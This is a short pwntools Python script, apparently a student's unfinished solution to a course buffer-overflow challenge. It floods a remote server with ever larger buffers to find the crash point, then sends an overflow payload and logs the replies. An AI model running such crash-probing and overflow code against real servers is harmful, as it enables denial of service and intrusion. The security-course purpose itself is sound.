from pwn import *
import sys

# Buffer size is not 16 on the server
LOCAL_BUFF_SIZE = 16
ACTUAL_BUFF_SIZE = 0x80000000


def recon(argv=[], *a, **kwargs):
    buff_size = 0x100000000
    # We don't know the actual buff size sp we must find it and crash the server
    while True:
        try:
            with remote(sys.argv[1], sys.argv[2], *a, **kwargs) as conn:
                with open("exploit.txt", "wb+") as f:
                    f.write(conn.recvline(2))
                    print(f"Sending 0x{buff_size:0x} bytes")
                    conn.sendline(b"A" * buff_size + b"\x01\x02\x03\x04")
                    f.write(conn.recvall())
                    buff_size *= 2
        except Exception as e:
            print(f"System crash at 0x{buff_size:0x} bytes")
            return buff_size


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
break *0x08049333
break *0x0804930d
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/usingFGets/challenge"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "DEBUG"

# Run the debugger

# We first need to cause the stack to crash
# Create a loop until we encounter "YOu're not the messiah!"
buffsize = recon()
# exit(1)
io = start()
io.recvline(2)

with open("exploit.txt", "wb+") as f:
    payload = (ACTUAL_BUFF_SIZE) * b"A" + b"\x55"
    io.sendline(payload)
    result = io.recvall()
    f.write(result)
# Add the canary below but into little endian form


# sys.stdout.buffer.write(16 * b"A" + b"\xff")
